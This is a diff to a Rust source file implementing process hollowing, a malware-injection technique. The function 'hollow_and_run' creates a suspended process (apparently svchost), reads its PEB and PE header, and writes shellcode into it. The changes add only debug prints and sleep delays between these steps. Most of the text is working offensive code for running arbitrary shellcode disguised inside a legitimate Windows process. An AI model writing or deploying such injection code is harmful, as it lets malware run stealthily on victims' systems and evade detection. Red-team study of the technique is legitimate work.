@@ -7,10 +7,11 @@ use windows::Win32::Foundation::PWSTR;
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessW, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW};
-
+use std::{thread, time};
 
 
 pub fn hollow_and_run(shellcode: &[u8]) {
+    let sleep_timer = time::Duration::from_millis(5000);
     // Create empty StartupInfoW struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -47,6 +48,10 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("Could not create the suspended process with CreateProcessW");
     }
 
+    let hand = process_information.hProcess;
+    println!("Process created, and it's handle is {hand:?}");
+    thread::sleep(sleep_timer);
+
     // Create empty PROCESS_BASIC_INFORMATION struct for use in ZwQueryInformationProcess
     // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
@@ -63,6 +68,10 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
     }
 
+    let peb = basic_information.PebBaseAddress as u64;
+    println!("PEB gotten I think {peb:?}");
+    thread::sleep(sleep_timer);
+
     // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
@@ -76,6 +85,9 @@ pub fn hollow_and_run(shellcode: &[u8]) {
         panic!("Could not read the address of the code base with ReadProcessMemory");
     }
 
+    println!("We read the 8 bytes");
+    thread::sleep(sleep_timer);
+
     // Use ReadProcessMemory again to read 512 bytes of memory; the PE header
     let mut svchost_base = io::Cursor::new(address_buffer);
     let svchost_base = svchost_base.read_u64::<LittleEndian>().unwrap();
@@ -87,6 +99,9 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     if !read_result.as_bool() {
         panic!("Could not read the PE header with ReadProcessMemory");
     }
+
+    println!("We read the 512 bytes");
+    thread::sleep(sleep_timer);
 
     // Write the shellcode to the suspended process with WriteProcessMemory
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
